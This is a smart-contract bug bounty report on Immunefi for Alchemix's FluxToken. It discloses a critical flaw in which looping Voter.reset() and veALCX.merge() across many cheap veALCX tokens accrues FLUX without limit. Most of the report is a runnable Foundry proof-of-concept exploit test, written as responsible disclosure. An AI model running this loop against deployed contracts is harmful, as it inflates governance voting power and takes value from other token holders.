# 31481 - \[SC - Critical] Undound FLUX accrual through reset and merge

Submitted on May 20th 2024 at 05:17:59 UTC by @DuckAstronomer for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31481

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/FluxToken.sol>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Vulnerability Details

The attacker can accrue FLUX indefinitely by following a loop: first, they call `Voter.reset()` to accrue FLUX for the current veALCX, then transfer the balance from that veALCX to a new veALCX using `veALCX.merge(oldId, newId)`, followed by claiming FLUX for the new veALCX. This process can be repeated multiple times to keep accruing FLUX continuously.

FLUX can be accrued by calling `Voter.reset()` once in an epoch for the current tokenId.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol#L191>

However, it's possible to transfer veALCX balance to a new tokeId by calling `veALCX.merge()`. This allows to claim FLUX one more time with `Voter.reset()`.

## Impact Details

Flux token allows to boost voting power. Unbounded Flux accrual allows to significantly change the voting results.

## Proof of Concept

Poc scenario:

1. The attacker mints the main veALCX with 1000 BAL tokens.
2. The attacker mints 100 more auxiliary veALCX with 10 wei of BAL each.
3. The loop begins.
4. In the loop, the attacker calls `Voter.reset()` to accrue FLUX amount.
5. The attacker immediately transfers the balance from veALCX from step 3 to a yet unused auxiliary veALCX by calling `veALCX.merge(lastId, currentId)`.
6. Go back to step 3.

To run the PoC, place the code below in the `PoC.t.sol` file and execute the command: `forge test --mp src/test/PoC.t.sol --fork-url 'URL'`.

```
pragma solidity ^0.8.15;

import "./BaseTest.sol";

contract Poc is BaseTest {
    function setUp() public {
        setupContracts(block.timestamp);
    }

    // Run as: forge test --mp src/test/Poc.t.sol --fork-url 'URL'
    function test_poc() public {
        address bad = address(1);

        uint256 NUMBER_ITER = 100;

        // The bad guy mints the main veALCX using 1000 BAL
        uint256 tokenId_bad = createVeAlcx(bad, 1000e18, MAXTIME, false);
        
        // The bad guy mints many auxiliary veALCX tokens using 10 wei of BAL
        uint256[] memory tokenIds = new uint256[](NUMBER_ITER);
        for (uint256 i; i < NUMBER_ITER; i++)
            tokenIds[i] = createVeAlcx(bad, 10, MAXTIME, false);

        hevm.startPrank(bad);

        // This is how much Flux the bad guy should accrue
        // without cheating.
        uint256 noCheating = veALCX.claimableFlux(tokenId_bad);

        // The bad guy accrues Flux in a loop
        // by calling Voter.reset() and then transferring balance to a new auxiliary veACLX by calling merge(last,current).
        uint256 lastId = tokenId_bad;
        for (uint256 i; i < NUMBER_ITER; i++) {
            uint256 currentId = tokenIds[i];

            uint256 beforeFlux = IERC20(flux).balanceOf(bad);

            // Accrue Flux when resetting
            // https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol#L191
            voter.reset(lastId);
            flux.claimFlux(lastId, veALCX.claimableFlux(lastId));

            uint256 afterFlux = IERC20(flux).balanceOf(bad);

            assertGt(afterFlux, beforeFlux);

            // Merge last->current, keep the wheel spinning
            veALCX.merge(lastId, currentId);

            lastId = currentId;
        }
        
        hevm.stopPrank();
        
        // The bad guy accrued after the attack.
        uint256 realFlux = IERC20(flux).balanceOf(bad);

        // The bad guy gets much more
        assertGe(realFlux, NUMBER_ITER*noCheating);
    }
}
```
